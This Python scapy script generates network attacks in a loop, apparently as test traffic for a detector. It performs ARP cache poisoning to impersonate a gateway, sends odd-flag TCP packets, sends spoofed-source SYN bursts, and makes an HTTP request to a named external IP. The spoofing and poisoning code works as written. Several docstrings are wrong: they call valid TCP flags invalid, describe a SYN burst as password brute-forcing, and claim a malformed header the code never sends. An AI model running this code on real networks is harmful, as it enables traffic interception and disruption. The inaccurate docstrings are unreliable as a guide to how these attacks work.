from scapy.all import *
from scapy.layers.inet import IP, TCP
from scapy.layers import http
import argparse
import time
import os
import sys

# Must be run with sudo
# You should run then sudo pip install -r requirements.txt

# Source : https://www.thepythoncode.com/article/building-arp-spoofer-using-scapy
# This file generate some attack :
# ARP spoofing

def get_mac(ip):
    """
    Returns the MAC address of any device connected to the network with the given IP address.

    This function sends an ARP request to the network asking for the MAC address of the device with the given IP address. If the device responds to the request, the function returns its MAC address. If the device does not respond, the function returns None.

    Args:
        ip (str): The IP address of the device to query.

    Returns:
        str or None: The MAC address of the device with the given IP address, or None if the device did not respond to the request.
    """
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src

def spoof(target_ip, host_ip, verbose=True):
    """
    Spoofs the ARP cache of `target_ip` to make it believe that we are `host_ip`.

    This function sends an ARP response packet to the target IP address, claiming that the MAC address of `host_ip` is our MAC address. This causes the target to update its ARP cache to associate `host_ip` with our MAC address, allowing us to intercept and modify network traffic between the target and `host_ip`.

    Args:
        target_ip (str): The IP address of the target to spoof.
        host_ip (str): The IP address of the host to impersonate.
        verbose (bool): Whether to print progress messages to the console. Defaults to True.

    Returns:
        None
    """
    print("Spoofing Attack")
    time.sleep(1)
    # get the mac address of the target
    target_mac = get_mac(target_ip)
    # craft the arp 'is-at' operation packet, in other words; an ARP response
    # we don't specify 'hwsrc' (source MAC address)
    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    # send the packet
    # verbose = 0 means that we send the packet without printing any thing
    send(arp_response, verbose=0)
    if verbose:
        # get the MAC address of the default interface we are using
        self_mac = ARP().hwsrc
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))

# malformed packet attack
def single_packet_attack(target):
    """
    Sends a single malformed TCP packet to the given IP address.

    This function sends a TCP packet with the PAU flag set to the given IP address. This flag is not a valid TCP flag and may cause network disruption or denial of service.

    Args:
        target (str): The IP address of the target to send the packet to.

    Returns:
        None
    """
    print("single_packet_attack")
    time.sleep(1)
    # Craft a TCP packet with the PAU flag set
    packet = IP(dst=target)/TCP(dport=80, flags='PAU')
    # Send the packet
    send(packet, verbose=0)
    time.sleep(4)

# Brute force attack
def spam_attack(target):
    """
    Sends a burst of TCP SYN packets to the given IP address.

    This function sends 50 TCP SYN packets with a spoofed source IP address of `192.168.0.1` to the given IP address. This simulates a brute force attack, in which an attacker attempts to connect to a service running on the target system with various passwords or credentials.

    Args:
        target (str): The IP address of the target to send the packets to.

    Returns:
        None
    """
    print("Brute force attack")
    time.sleep(1)
    for i in range(50):
        pkt = IP(src="192.168.0.1", dst=target)/TCP(flags="S")
        send(pkt, verbose=0)
        time.sleep(0.1)

def bad_url_http_request():
    """
    Sends an HTTP GET request to a known-bad IP address.

    This function sends an HTTP GET request to the IP address `89.159.196.94`, which is known to host malicious content. The request is sent to the default HTTP port (port 80) and includes a deliberately malformed HTTP header. This simulates a malicious HTTP request, which may attempt to exploit vulnerabilities in the target system or download malware onto the system.

    Args:
        None

    Returns:
        None
    """
    print("bad_url_http_request")
    time.sleep(1)
    # Create GET request packet
    get_request = b"GET / HTTP/1.1\r\nHost: 89.159.196.94\r\n\r\n"
    pkt = IP(dst="89.159.196.94") / TCP(dport=80) / Raw(load=get_request)

    # Send packet and receive response
    response = sr1(pkt, verbose=0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Generate network attacks")
    parser.add_argument("--target", metavar="target", type=str, default="192.168.1.95", help="The IP address of the target to attack")
    parser.add_argument("--host", metavar="host", type=str, default="192.168.1.254", help="The IP address of the host to impersonate")
    parser.add_argument("-v", "--verbose", action="store_true", help="Print progress messages to the console")

    args = parser.parse_args()

    target = args.target
    host = args.host
    verbose = args.verbose

    # enable IP forwarding
    #enable_ip_route()

    while True:
        # attack single packet
        single_packet_attack(target)

        # tell the `target` that we are the `host`
        # ARP poisoning
        spoof(target, host, verbose)

        # simulate a brute force attack
        spam_attack(target)

        # simulate a malicious HTTP request
        bad_url_http_request()

        # sleep for one second
        time.sleep(5)

